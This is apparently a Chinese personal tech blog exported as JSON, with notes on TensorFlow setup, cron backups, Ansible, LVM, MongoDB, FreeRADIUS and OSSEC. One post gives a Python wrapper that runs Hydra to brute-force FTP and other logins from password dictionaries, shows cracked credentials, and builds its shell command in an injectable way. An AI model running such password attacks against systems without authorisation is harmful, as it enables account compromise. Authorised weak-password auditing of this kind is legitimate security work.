[{"title":"TensorFlow环境搭建","date":"2017-03-19T15:52:42.000Z","path":"ml/TensorFlow环境搭建/","text":"前言 虽然之前零零散散的有看过TensorFlow, 但前些天才买了一本《TensorFlow实战》来系统的进行学习，所以这里记录一些笔记，以供备忘 测试环境搭建安装Anaconda3 之前自己本地使用的都是Anaconda2, 看到越来越多的东西都在推Py3,所以折腾TF的时候也安装个Anaconda3 123通过其官网下载命令行安装版https://repo.continuum.io/archive/Anaconda3-4.3.1-MacOSX-x86_64.sh然后直接 bash Anaconda3-4.3.1-MacOSX-x86_64.sh 安装成功后提示修改PATH由于我使用的是zsh，所以直接修改.zshrc文件即可 1234567891011121314151617installing: conda-env-2.6.0-0 ...Python 3.6.0 :: Continuum Analytics, Inc.creating default environment...installation finished.Do you wish the installer to prepend the Anaconda3 install locationto PATH in your /Users/tp/.bash_profile ? [yes|no][yes] &gt;&gt;&gt;Prepending PATH=/Users/tp/anaconda3/bin to PATH in /Users/tp/.bash_profileA backup will be made to: /Users/tp/.bash_profile-anaconda3.bakFor this change to become active, you have to open a new terminal.Thank you for installing Anaconda3!Share your notebooks and packages on Anaconda Cloud!Sign up for free: https://anaconda.org .zshrc中加入PATH1export PATH=&quot;/Users/tp/anaconda3/bin:$PATH&quot; 通过Anaconda安装TensorFlow环境1234567891011121314151617181920212223242526272829303132333435363738➜ ~ conda create -n tensorflow python=3.5Fetching package metadata ...........Solving package specifications: .Package plan for installation in environment /Users/tp/anaconda3/envs/tensorflow:The following NEW packages will be INSTALLED: openssl: 1.0.2k-1 pip: 9.0.1-py35_1 python: 3.5.3-1 readline: 6.2-2 setuptools: 27.2.0-py35_0 sqlite: 3.13.0-0 tk: 8.5.18-0 wheel: 0.29.0-py35_0 xz: 5.2.2-1 zlib: 1.2.8-3Proceed ([y]/n)? yopenssl-1.0.2k 100% |################################| Time: 0:00:01 1.72 MB/sreadline-6.2-2 100% |################################| Time: 0:00:00 11.93 MB/ssqlite-3.13.0- 100% |################################| Time: 0:00:00 6.10 MB/stk-8.5.18-0.ta 100% |################################| Time: 0:00:00 3.84 MB/sxz-5.2.2-1.tar 100% |################################| Time: 0:00:00 1.15 MB/szlib-1.2.8-3.t 100% |################################| Time: 0:00:00 8.54 MB/spython-3.5.3-1 100% |################################| Time: 0:00:02 5.15 MB/ssetuptools-27. 100% |################################| Time: 0:00:00 5.15 MB/swheel-0.29.0-p 100% |################################| Time: 0:00:00 6.24 MB/spip-9.0.1-py35 100% |################################| Time: 0:00:00 4.64 MB/s## To activate this environment, use:# &gt; source activate tensorflow## To deactivate this environment, use:# &gt; source deactivate tensorflow#","tags":[{"name":"TensorFlow","slug":"TensorFlow","permalink":"http://yoursite.com/tags/TensorFlow/"},{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"},{"name":"机器学习","slug":"机器学习","permalink":"http://yoursite.com/tags/机器学习/"}]},{"title":"数据备份脚本与crontab","date":"2017-03-14T11:52:44.000Z","path":"devops/数据备份脚本与crontab/","text":"目的1想实现将本机特定目录下的文件夹打包 然后rsync到备份服务器上，代码如下 文件保存7天 1234567891011#!/bin/bashcp -r /srv/docker/gitlab/gitlab /srv/cron/data/gitlabzip -P mima -rm boot-`date +%Y%m%d`.zip data/gitlab/mv boot-`date +%Y%m%d`.zip datafind . -type f -mtime +7 -exec rm -fr &#123;&#125; \\;rsync -av --progress -e \"ssh -p ServerSSHPort\" data ServerUserName@ServerIP::phone --partial --delete crontab命令格式 crontab [-u user] file crontab [-u user] [ -e | -l | -r ] -u user：用来设定某个用户的crontab服务；file：file是命令文件的名字,表示将file做为crontab的任务列表文件并载入crontab。如果在命令行中没有指定这个文件，crontab命令将接受标准输入（键盘）上键入的命令，并将它们载入crontab。-e：编辑某个用户的crontab文件内容。如果不指定用户，则表示编辑当前用户的crontab文件。-l：显示某个用户的crontab文件内容，如果不指定用户，则表示显示当前用户的crontab文件内容。-r：从/var/spool/cron目录中删除某个用户的crontab文件，如果不指定用户，则默认删除当前用户的crontab文件。-i：在删除用户的crontab文件时给确认提示。 12 列出crontab文件1crontab -l 对crontab作备份1crontab -l &gt; $HOME/mycron 文件格式123456第1列分钟0～59第2列小时0～23（0表示子夜）第3列日1～31第4列月1～12第5列星期0～7（0和7表示星期天）第6列要运行的命令 编辑crontab文件 crontab -e 123456789101112131415161718192021222324实例1：每1分钟执行一次myCommand* * * * * myCommand实例2：每小时的第3和第15分钟执行3,15 * * * * myCommand实例3：在上午8点到11点的第3和第15分钟执行3,15 8-11 * * * myCommand实例4：每隔两天的上午8点到11点的第3和第15分钟执行3,15 8-11 */2 * * myCommand实例5：每周一上午8点到11点的第3和第15分钟执行3,15 8-11 * * 1 myCommand实例6：每晚的21:30重启smb30 21 * * * /etc/init.d/smb restart实例7：每月1、10、22日的4 : 45重启smb45 4 1,10,22 * * /etc/init.d/smb restart实例8：每周六、周日的1 : 10重启smb10 1 * * 6,0 /etc/init.d/smb restart实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb0,30 18-23 * * * /etc/init.d/smb restart实例10：每星期六的晚上11 : 00 pm重启smb0 23 * * 6 /etc/init.d/smb restart实例11：每一小时重启smb* */1 * * * /etc/init.d/smb restart实例12：晚上11点到早上7点之间，每隔一小时重启smb0 23-7 * * * /etc/init.d/smb restart","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"自动化运维工具-Ansible","date":"2017-02-20T14:12:41.000Z","path":"devops/自动化运维工具-Ansible/","text":"1. 安装 环境 MacOS 1sudo pip install ansible 2. 配置 创建hosts文件 12sudo mkdir -p /etc/ansiblesudo vim /etc/ansible/hosts 2.1 添加主机 在hosts中加入相应的主机，也可以根据自己实际情况创建相应组,比如我的 另外，如果修改了ssh默认端口，则在相应的ip后面加上端口 123456789[***]120.***.8.**:7788[***]***.***.***.230[local]192.168.1.180 还可以通过定义别名的方式将服务器信息写入hosts文件，如下其中jumper为该服务器别名，可根据自己实际情况修改为其它任意字符串 1jumper ansible_ssh_user=ubuntu ansible_ssh_host=***.***.***.230 相关的参数还有 1234567891011121314151617181920212223242526272829303132ansible_ssh_host 将要连接的远程主机名.与你想要设定的主机的别名不同的话,可通过此变量设置.ansible_ssh_port ssh端口号.如果不是默认的端口号,通过此变量设置.ansible_ssh_user 默认的 ssh 用户名ansible_ssh_pass ssh 密码(这种方式并不安全,我们强烈建议使用 --ask-pass 或 SSH 密钥)ansible_sudo_pass sudo 密码(这种方式并不安全,我们强烈建议使用 --ask-sudo-pass)ansible_sudo_exe (new in version 1.8) sudo 命令路径(适用于1.8及以上版本)ansible_connection 与主机的连接类型.比如:local, ssh 或者 paramiko. Ansible 1.2 以前默认使用 paramiko.1.2 以后默认使用 'smart','smart' 方式会根据是否支持 ControlPersist, 来判断'ssh' 方式是否可行.ansible_ssh_private_key_file ssh 使用的私钥文件.适用于有多个密钥,而你不想使用 SSH 代理的情况.ansible_shell_type 目标系统的shell类型.默认情况下,命令的执行使用 'sh' 语法,可设置为 'csh' 或 'fish'.ansible_python_interpreter 目标主机的 python 路径.适用于的情况: 系统中有多个 Python, 或者命令路径不是\"/usr/bin/python\",比如 \\*BSD, 或者 /usr/bin/python 不是 2.X 版本的 Python.我们不使用 \"/usr/bin/env\" 机制,因为这要求远程用户的路径设置正确,且要求 \"python\" 可执行程序名不可为 python以外的名字(实际有可能名为python26). 与 ansible_python_interpreter 的工作方式相同,可设定如 ruby 或 perl 的路径.... 2.2 测试连接主机 添加hosts后，就通过ping module测试是否能连接相应的主机 如果主机默认用户不是root，则可通过 -u 指定用户，如sudo ansible all -m ping -k -u username 123456789101112131415➜ ~ sudo ansible all -m ping -kSSH password:***.***.***.230 | UNREACHABLE! =&gt; &#123; \"changed\": false, \"msg\": \"('Bad authentication type', [u'publickey']) (allowed_types=[u'publickey'])\", \"unreachable\": true&#125;120.***.8.** | SUCCESS =&gt; &#123; \"changed\": false, \"ping\": \"pong\"&#125;192.168.1.180 | SUCCESS =&gt; &#123; \"changed\": false, \"ping\": \"pong\"&#125; 2.3 ansible-doc 使用过程中可以通过ansible-doc 查看一些模块的介绍 123➜ ~ ansible-doc -l | wc -l 773➜ ~ ansible-doc command 2.4 ansible基本功能-copy文件 实现将某文件copy到所有机器上，以nihao.py为例 1234567891011121314151617181920212223242526272829303132333435363738394041424344➜ ~ sudo ansible all -m copy -a \"src=nihao.py dest=/tmp/ \" -kSSH password:***.***.***.** | SUCCESS =&gt; &#123; \"changed\": true, \"checksum\": \"da39a3ee5e6b4b0d3255bfef95601890afd80709\", \"dest\": \"/tmp/nihao.py\", \"gid\": 0, \"group\": \"root\", \"md5sum\": \"d41d8cd98f00b204e9800998ecf8427e\", \"mode\": \"0644\", \"owner\": \"root\", \"size\": 0, \"src\": \"/root/.ansible/tmp/ansible-tmp-1489661516.77-128012169072532/source\", \"state\": \"file\", \"uid\": 0&#125;192.168.1.180 | SUCCESS =&gt; &#123; \"changed\": true, \"checksum\": \"da39a3ee5e6b4b0d3255bfef95601890afd80709\", \"dest\": \"/tmp/nihao.py\", \"gid\": 0, \"group\": \"root\", \"md5sum\": \"d41d8cd98f00b204e9800998ecf8427e\", \"mode\": \"0644\", \"owner\": \"root\", \"size\": 0, \"src\": \"/root/.ansible/tmp/ansible-tmp-1489661516.91-185355159665551/source\", \"state\": \"file\", \"uid\": 0&#125;backup | SUCCESS =&gt; &#123; \"changed\": true, \"checksum\": \"da39a3ee5e6b4b0d3255bfef95601890afd80709\", \"dest\": \"/tmp/nihao.py\", \"gid\": 500, \"group\": \"ubuntu\", \"md5sum\": \"d41d8cd98f00b204e9800998ecf8427e\", \"mode\": \"0664\", \"owner\": \"ubuntu\", \"size\": 0, \"src\": \"/home/ubuntu/.ansible/tmp/ansible-tmp-1489661517.06-86408822620129/source\", \"state\": \"file\", \"uid\": 500&#125; 然后查看是否在服务器上 12345678910➜ ~ sudo ansible all -m command -a \"ls -l /tmp/nihao.py\" -kSSH password:***.***.**.*** | SUCCESS | rc=0 &gt;&gt;-rw-r--r-- 1 root root 0 3月 16 18:51 /tmp/nihao.py120.132.8.73 | SUCCESS | rc=0 &gt;&gt;-rw-r--r-- 1 root root 0 Mar 16 00:51 /tmp/nihao.pybackup | SUCCESS | rc=0 &gt;&gt;-rw-rw-r-- 1 ubuntu ubuntu 0 Mar 16 18:51 /tmp/nihao.py 3. playbook Ansible 的配置管理脚本称为playbook每一个play必须包含以下两项 host: 需要配置的主机 task: 需要在这些主机上执行的任务 还有一些常见(非必须)的有name sudo 和vars(变量与其值组成的list)","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"运维","slug":"运维","permalink":"http://yoursite.com/tags/运维/"}]},{"title":"LVM相关介绍","date":"2016-09-20T14:54:45.000Z","path":"devops/LVM相关介绍/","text":"LVM概念 Logical Volume Manager 逻辑卷管理 12通过将底层物理硬盘抽象封装起来，以逻辑卷的形式表现给上层系统，逻辑卷的大小可以动态调整，而且不会丢失现有数据。新加入的硬盘也不会改变现有上层的逻辑卷。作为一种多台磁盘管理机制，逻辑卷技术大大提高了磁盘管理的灵活性。 LVM的4个基本概念1234567① PE (Physical Extend) 物理拓展② PV (Physical Volume) 物理卷③ VG (Volume Group) 卷组④ LV (Logical Volume) 逻辑卷 PE逻辑卷空间管理的最基本单位。1个PE默认是4M大小VG的作用是用来装PV的–空间池 创建LVM123456789101112131415161718➜ ~ fdisk -lDisk /dev/sda: 300 GiB, 322122547200 bytes, 629145600 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisklabel type: dosDisk identifier: 0xc1fc20aeDevice Boot Start End Sectors Size Id Type/dev/sda1 * 2048 612370431 612368384 292G 83 Linux/dev/sda2 612372478 629143551 16771074 8G 5 Extended/dev/sda5 612372480 629143551 16771072 8G 82 Linux swap / SolarisDisk /dev/sdb: 50 GiB, 53687091200 bytes, 104857600 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytes 将物理磁盘设备初始化为物理卷12➜ ~ pvcreate /dev/sdb Physical volume &quot;/dev/sdb&quot; successfully created 查看物理卷信息123➜ ~ pvs PV VG Fmt Attr PSize PFree /dev/sdb lvm2 --- 50.00g 50.00g 创建卷组，并将PV加入卷组中123&gt;名字为lvmtest， 可任意➜ ~ vgcreate lvmtest /dev/sdb Volume group &quot;lvmtest&quot; successfully created 12345678910111213141516171819202122232425➜ ~ vgs VG #PV #LV #SN Attr VSize VFree lvmtest 1 0 0 wz--n- 50.00g 50.00g&gt;查看卷组信息➜ ~ vgdisplay --- Volume group --- VG Name lvmtest System ID Format lvm2 Metadata Areas 1 Metadata Sequence No 1 VG Access read/write VG Status resizable MAX LV 0 Cur LV 0 Open LV 0 Max PV 0 Cur PV 1 Act PV 1 VG Size 50.00 GiB PE Size 4.00 MiB Total PE 12799 Alloc PE / Size 0 / 0 Free PE / Size 12799 / 50.00 GiB VG UUID cxMG1m-pMAE-Suk5-bM69-1sB3-W7YB-WXmmGh 基于卷组创建逻辑卷 这里我从lvmtest拿了20G空间来创建了一个名为lv1的逻辑卷 12➜ ~ lvcreate -n lv1 -L 20G lvmtest Logical volume \"lv1\" created 查看逻辑卷信息1234567891011121314151617181920➜ ~ lvs LV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert lv1 lvmtest -wi-a----- 20.00g ➜ ~ lvdisplay --- Logical volume --- LV Path /dev/lvmtest/lv1 LV Name lv1 VG Name lvmtest LV UUID Q4UIbv-yWhL-Bl5A-ywTN-1HJo-TE5r-TKBPfQ LV Write Access read/write LV Creation host, time kali, 2016-08-03 08:44:31 +0800 LV Status available # open 0 LV Size 20.00 GiB Current LE 5120 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 256 Block device 254:0 为创建好的逻辑卷创建文件系统 123456789101112➜ ~ mkfs.ext4 /dev/lvmtest/lv1mke2fs 1.42.12 (29-Aug-2014)Creating filesystem with 5242880 4k blocks and 1310720 inodesFilesystem UUID: 5130e6e1-8293-4fcb-b580-5091f3840f99Superblock backups stored on blocks: 32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208, 4096000Allocating group tables: done Writing inode tables: done Creating journal (32768 blocks): doneWriting superblocks and filesystem accounting information: done 将格式化好的逻辑卷挂载使用 1➜ ~ mount /dev/lvmtest/lv1 /mnt/ 查看12➜ /mnt mount | tail -n 1/dev/mapper/lvmtest-lv1 on /mnt type ext4 (rw,relatime,data=ordered) 删除LVM 先把相应的东西umount掉1➜ ~ umount /mnt 12➜ ~ mount | tail -n 1/dev/sr0 on /media/cdrom0 type iso9660 (ro,nosuid,nodev,noexec,relatime,user) 删除LV 123➜ ~ lvremove /dev/lvmtest/lv1Do you really want to remove active logical volume lv1? [y/n]: y Logical volume &quot;lv1&quot; successfully removed 删除VG 12➜ ~ vgremove lvmtest Volume group &quot;lvmtest&quot; successfully removed 删除物理卷 12➜ ~ pvremove /dev/sdb Labels on physical volume &quot;/dev/sdb&quot; successfully wiped 扩充逻辑卷容量 逻辑卷的拉伸操作可以在线执行，不需要卸载逻辑卷 保证VG中有足够的空闲空间 123➜ ~ vgs VG #PV #LV #SN Attr VSize VFree vg 1 1 0 wz--n- 50.00g 30.00g 扩充逻辑卷 123➜ ~ lvextend -L +1G /dev/vg/lv Size of logical volume vg/lv changed from 20.00 GiB (5120 extents) to 21.00 GiB (5376 extents). Logical volume lv successfully resized 查看扩充后LV大小 1234567891011121314151617➜ ~ lvdisplay --- Logical volume --- LV Path /dev/vg/lv LV Name lv VG Name vg LV UUID 5q9mCJ-7Y3f-dEo7-xlDz-lJAW-Oczm-RuCeIE LV Write Access read/write LV Creation host, time kali, 2016-08-03 09:51:18 +0800 LV Status available # open 0 LV Size 21.00 GiB Current LE 5376 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 256 Block device 254:0 更新文件系统 12345➜ ~ resize2fs /dev/vg/lvresize2fs 1.42.12 (29-Aug-2014)Filesystem at /dev/vg/lv is mounted on /mnt; on-line resizing requiredold_desc_blocks = 2, new_desc_blocks = 2The filesystem on /dev/vg/lv is now 5505024 (4k) blocks long. 查看更新后文件系统 123456789101112➜ ~ df -hFilesystem Size Used Avail Use% Mounted onudev 10M 0 10M 0% /devtmpfs 792M 9.1M 783M 2% /run/dev/sda1 288G 16G 257G 6% /tmpfs 2.0G 208K 2.0G 1% /dev/shmtmpfs 5.0M 0 5.0M 0% /run/locktmpfs 2.0G 0 2.0G 0% /sys/fs/cgrouptmpfs 396M 8.0K 396M 1% /run/user/132tmpfs 396M 12K 396M 1% /run/user/0/dev/sr0 3.1G 3.1G 0 100% /media/cdrom0/dev/mapper/vg-lv 21G 44M 20G 1% /mnt 扩充卷组容量 将要添加到VG的硬盘格式化为PV 12➜ ~ pvcreate /dev/sdc Physical volume &quot;/dev/sdc&quot; successfully created 将新的PV添加到指定卷组中 12➜ ~ vgextend vg /dev/sdc Volume group &quot;vg&quot; successfully extended 查看扩充后VG大小 123➜ ~ vgs VG #PV #LV #SN Attr VSize VFree vg 2 1 0 wz--n- 69.99g 48.99g 缩小逻辑卷容量 逻辑卷的缩小操作必须离线执行，要卸载逻辑卷 卸载一键挂载的逻辑卷 1➜ ~ umount /dev/mapper/vg-lv 缩小文件系统 缩小为10G 1234567891011121314151617181920➜ ~ resize2fs /dev/vg/lv 10Gresize2fs 1.42.12 (29-Aug-2014)Please run &apos;e2fsck -f /dev/vg/lv&apos; first.➜ ~ resize2fs /dev/mapper/vg-lv 10Gresize2fs 1.42.12 (29-Aug-2014)Please run &apos;e2fsck -f /dev/mapper/vg-lv&apos; first.➜ ~ e2fsck -f /dev/mapper/vg-lve2fsck 1.42.12 (29-Aug-2014)Pass 1: Checking inodes, blocks, and sizesPass 2: Checking directory structurePass 3: Checking directory connectivityPass 4: Checking reference countsPass 5: Checking group summary information/dev/mapper/vg-lv: 11/1376256 files (0.0% non-contiguous), 130401/5505024 blocks➜ ~ resize2fs /dev/mapper/vg-lv 10Gresize2fs 1.42.12 (29-Aug-2014)Resizing the filesystem on /dev/mapper/vg-lv to 2621440 (4k) blocks.The filesystem on /dev/mapper/vg-lv is now 2621440 (4k) blocks long. 缩小LV 缩小的容量为之前的容量减去文件系统容量21-10=11 123456➜ ~ lvreduce -L -11G /dev/vg/lv WARNING: Reducing active logical volume to 10.00 GiB THIS MAY DESTROY YOUR DATA (filesystem etc.)Do you really want to reduce lv? [y/n]: y Size of logical volume vg/lv changed from 21.00 GiB (5376 extents) to 10.00 GiB (2560 extents). Logical volume lv successfully resized 查看缩小后的LV 1234567891011121314151617➜ ~ lvdisplay --- Logical volume --- LV Path /dev/vg/lv LV Name lv VG Name vg LV UUID 5q9mCJ-7Y3f-dEo7-xlDz-lJAW-Oczm-RuCeIE LV Write Access read/write LV Creation host, time kali, 2016-08-03 09:51:18 +0800 LV Status available # open 0 LV Size 10.00 GiB Current LE 2560 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 256 Block device 254:0 挂载 123➜ ~ mount /dev/vg/lv /mnt➜ ~ mount | tail -n 1/dev/mapper/vg-lv on /mnt type ext4 (rw,relatime,data=ordered) 缩小卷组 将一个PV从制定卷组中移除 12➜ ~ vgreduce vg /dev/sdc Removed &quot;/dev/sdc&quot; from volume group &quot;vg&quot; 查看缩小后的卷组大小 123456789101112131415161718192021~ vgdisplay--- Volume group ---VG Name vgSystem ID Format lvm2Metadata Areas 1Metadata Sequence No 8VG Access read/writeVG Status resizableMAX LV 0Cur LV 1Open LV 1Max PV 0Cur PV 1Act PV 1VG Size 50.00 GiBPE Size 4.00 MiBTotal PE 12799Alloc PE / Size 2560 / 10.00 GiBFree PE / Size 10239 / 40.00 GiBVG UUID E32ZJW-3NqL-jpr2-1KYN-QWDh-dZhJ-1ZxZ2i 移除物理卷 12345678910➜ ~ pvs PV VG Fmt Attr PSize PFree /dev/sdb vg lvm2 a-- 50.00g 40.00g /dev/sdc lvm2 --- 20.00g 20.00g➜ ~ pvremove /dev/sdc Labels on physical volume &quot;/dev/sdc&quot; successfully wiped➜ ~ pvs PV VG Fmt Attr PSize PFree /dev/sdb vg lvm2 a-- 50.00g 40.00g➜ ~","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"LVM","slug":"LVM","permalink":"http://yoursite.com/tags/LVM/"}]},{"title":"hydra 折腾笔记","date":"2016-09-20T10:18:54.000Z","path":"sec/hydra-折腾笔记/","text":"命令1output =subprocess.Popen(\"hydra -l ftp -P wooyun.txt 192.168.1.20 ftp\", shell=True,stdout=subprocess.PIPE).communicate()[0] 123In [62]: &apos;successfully&apos; in outputOut[62]: True 相关文档 http://www.cnblogs.com/mchina/archive/2013/01/01/2840815.html 备选方案 全能暴力破解测试工具——Patator v0.5https://github.com/lanjelot/patator python 捕获 shell 脚本的输出结果12345678910111213141516import subprocessoutput =Popen([\"mycmd\",\"myarg\"], stdout=PIPE).communicate()[0]import subprocessp = subprocess.Popen(['ls','-a'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)out, err = p.communicate()print out# work on Unix/Linux onlyimport commandsprint commands.getstatusoutput('wc -l file')[1] [Demo] Py-hydra123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293# -*- coding: utf-8 -*-'''通过Python操作Hydra进行相关服务弱口令扫描相关结果以json的形式返回'''__author__ = \"SanNa\"import subprocessimport sysimport jsonimport signal# 设置超时时间TIME_OUT = 20def start_hydra(ip, service, username, password): '''调用hydra进行破解 :param ip: 目标ip :param service: 服务类型 :param username: 用户字典 :param password: 密码字典 :return str ''' kwargs = &#123; 'ip': ip, 'service': service, 'username': username, 'password': password, &#125; command_str = \"hydra -L &#123;username&#125; -P &#123;password&#125; &#123;ip&#125; &#123;service&#125;\" result = subprocess.Popen(command_str.format(**kwargs), shell=True, stdout=subprocess.PIPE).communicate()[0] return resultdef return_json(result): '''从扫描结果中提出相关信息 :param result: 扫描结果 :return json ''' ok_flag = 'target successfully completed' fail_flag = '0 valid passwords found' data = &#123; 'login': None, 'password': None, &#125; if ok_flag in result: data['status'] = 'success' item = result.split('\\n')[5] data['login'] = item.split(' ')[6] data['password'] = item.split(' ')[10] elif fail_flag in result: data['status'] = 'fail' else: data['status'] = 'unknown error.' return json.dumps([data])def handler(signum, frame): raise AssertionErrorif __name__ == '__main__': ip = sys.argv[1] service = sys.argv[2] username = 'username.txt' password = 'password.txt' # try: # username = sys.argv[3] # except: # username = 'ftp' # try: # password = sys.argv[4] # except: # password = 'ftp' print '[*] Place wait...' try: # 超时设置 signal.signal(signal.SIGALRM, handler) signal.alarm(TIME_OUT) result = start_hydra(ip, service, username, password) print result data = return_json(result) except AssertionError: print \"TIMEOUT!\" 执行结果123456789101112➜ hydar python test.py 192.168.1.55 ftp[*] Place wait...Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (http://www.thc.org/thc-hydra) starting at 2016-06-02 12:41:32[DATA] max 16 tasks per 1 server, overall 64 tasks, 22425 login tries (l:69/p:325), ~21 tries per task[DATA] attacking service ftp on port 21[21][ftp] host: 192.168.1.55 login: ftp password: ftp1 of 1 target successfully completed, 1 valid password foundHydra (http://www.thc.org/thc-hydra) finished at 2016-06-02 12:41:37[&#123;&quot;status&quot;: &quot;success&quot;, &quot;login&quot;: &quot;ftp&quot;, &quot;password&quot;: &quot;ftp&quot;&#125;] 备选方案 全能暴力破解测试工具——Patator v0.5https://github.com/lanjelot/patator","tags":[{"name":"hydra","slug":"hydra","permalink":"http://yoursite.com/tags/hydra/"}]},{"title":"MongoDB 开机自启动","date":"2016-09-20T08:18:41.000Z","path":"db/MongoDB-开机自启动/","text":"mongodb1vim /etc/rc.d/init.d/mongodb 如果需要后台的方式启动，则为/dat0/mongodb/bin/mongod –dbpath=/data/db/ –fork –logpath=/data/logs/mongodb.log 123456789101112131415161718192021222324252627#!/bin/sh # #chkconfig: 2345 80 90 #description: mongodb start() &#123; /dat0/mongodb/bin/mongod&#125; stop() &#123; /dat0/mongodb/bin/mongod --shutdown &#125; case \"$1\" in start) start ;; stop) stop ;; restart) stop start ;; *) echo $\"Usage: $0 &#123;start|stop|restart&#125;\" exit 1 esac 123chkconfig --add mongodb chmod +x mongodb chkconfig mongodb on","tags":[{"name":"MongoDB","slug":"MongoDB","permalink":"http://yoursite.com/tags/MongoDB/"}]},{"title":"FreeRADIUS","date":"2016-09-18T12:30:23.000Z","path":"devops/FreeRADIUS/","text":"Radius Remote Authentication Dial In User Service 远程访问拨号用户服务1RADIUS是一种C/S结构的协议，它的客户端最初就是NAS（Net Access Server）服务器，任何运行RADIUS客户端软件的计算机都可以成为RADIUS的客户端。RADIUS协议认证机制灵活，可以采用PAP、CHAP或者Unix登录认证等多种方式。RADIUS是一种可扩展的协议，它进行的全部工作都是基于Attribute-Length-Value的向量进行的。RADIUS也支持厂商扩充厂家专有属性。 Freeradius Install Ubuntu. 1wget ftp://ftp.freeradius.org/pub/freeradius/freeradius-server-3.0.11.tar.gz 1tar zxf freeradius-server-3.0.11.tar.gz 1cd freeradius-server-3.0.11/ 1./configure Bug Fix在configure时可能会出现failed linking to libcrypto. Use –with-openssl-lib-dir=, or –with-openssl=no (builds without OpenSSL)解决办法123Red Hat, Fedora, CentOS - openssl-develDebian, Ubuntu - libssl-devArch - openssl error: FreeRADIUS requires libtalloc 1yum install libtalloc-devel -y 1sudo make &amp;&amp; make install 运行1radiusd -X 测试1adtest hello hello localhost 0 testing123 To Do 修改的模块是modules里面的rlm_realm，这个module完成了Proxy的相关业务逻辑，我们需要开发HUE的rlm_realm，并打包。1./src/modules/rlm_realm/rlm_realm.c PAM Pluggable Authentication Modules 可插拔认证模块http://www.ibm.com/developerworks/cn/linux/l-pam/ PAM的文件123/etc/pam.conf或者/etc/pam.d/ PAM配置文件/usr/lib/security/pam_*.so 可动态加载的PAM service module对于RedHat，其目录不是/usr/lib，而是/lib","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"FreeRADIUS","slug":"FreeRADIUS","permalink":"http://yoursite.com/tags/FreeRADIUS/"}]},{"title":"Centos 6.6 Install OSSEC","date":"2016-08-27T12:22:02.000Z","path":"sec/Centos-6-6-Install-OSSEC/","text":"前言 OSSEC是一款开源的基于主机的入侵检测系统，可以简称为HIDS。它具备日志分析，文件完整性检查，策略监控，rootkit检测，实时报警以及联动响应等功能。它支持多种操作系统：Linux、Windows、MacOS、Solaris、HP-UX、AIX。属于企业安全之利器。 环境CentOS 6.6 安装关联库和软件首先我们安装需要用到的关联库和软件，由于我们最终是需要把日志导入到MySQL中进行分析，以及需要通过web程序对报警结果进行展示，同时需要把本机当做SMTP，所以需要在本机安装MySQL、Apache和sendmail服务。在当前的终端中执行如下命令：1yum install wget gcc make mysql mysql-server mysql-devel httpd php php-mysql sendmail 启动服务123[root@ossec-server ~]# /etc/init.d/httpd start[root@ossec-server ~]# /etc/init.d/mysqld start[root@ossec-server ~]# /etc/init.d/sendmail start Mysql相关配置123456[root@ossec-server ~]# mysql -uroot -pmysql&gt; create database ossec;mysql&gt; grant INSERT,SELECT,UPDATE,CREATE,DELETE,EXECUTE on ossec.* to ossec@localhost;mysql&gt; set password for ossec@localhost=PASSWORD(&apos;ossec&apos;);mysql&gt; flush privileges;mysql&gt; exit 安装OSSEC服务端 首先通过官网的链接下载当前的最新稳定版本 2.8.3 的服务端包，同时解压。 123456789wget https://akamai.bintray.com/87/87c7a1904d5c08c7cff3e42bd47c055b14b08faa?__gda__=exp=1465265745~hmac=3dacb2ddfc1c2aff8eeeff60f6c1ec8cbebf3dab98370b6894f3d87399be85ed&amp;response-content-disposition=attachment%3Bfilename%3D%22ossec-hids-2.8.3.tar.gz%22&amp;response-content-type=application%2Fgzip重命名文件mv 87c7a1904d5c08c7cff3e42bd47c055b14b08faa\\?__gda__\\=exp\\=1465265745~hmac\\=3dacb2ddfc1c2aff8eeeff60f6c1ec8cbebf3dab98370b6894f3d87399be85ed ossec.tar.gz解压[root@CentOS-6 ~]# tar -zxf ossec.tar.gz[root@CentOS-6 ~]# ls– ossec-hids-2.8.3anaconda-ks.cfg ossec.tar.gz 为了使OSSEC支持MySQL，需要在安装前执行make setdb命令，如下 123456789101112[root@CentOS-6 ossec-hids-2.8.3]# cd src[root@CentOS-6 src]# lsaddagent error_messages LOCATION os_crypto os_regex syscheckdagentlessd external logcollector os_csyslogd os_xml testsanalysisd headers Makeall os_dbd os_zlib utilclient-agent init Makefile os_execd remoted VERSIONconfig InstallAgent.sh monitord os_maild rootcheck win32Config.Make InstallServer.sh os_auth os_net shared[root@CentOS-6 src]# make setdbInfo: Compiled with MySQL support.Info: Compiled with PostgreSQL support.[root@CentOS-6 src]# cd .. 执行安装脚本 1234567891011121314151617181920[root@CentOS-6 ossec-hids-2.8.3]# ./install.shwhich: no host in (/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin) ** Para instalação em português, escolha [br]. ** 要使用中文进行安装, 请选择 [cn]. ** Fur eine deutsche Installation wohlen Sie [de]. ** Για εγκατάσταση στα Ελληνικά, επιλέξτε [el]. ** For installation in English, choose [en]. ** Para instalar en Español , eliga [es]. ** Pour une installation en français, choisissez [fr] ** A Magyar nyelvű telepítéshez válassza [hu]. ** Per l&apos;installazione in Italiano, scegli [it]. ** 日本語でインストールします．選択して下さい．[jp]. ** Voor installatie in het Nederlands, kies [nl]. ** Aby instalować w języku Polskim, wybierz [pl]. 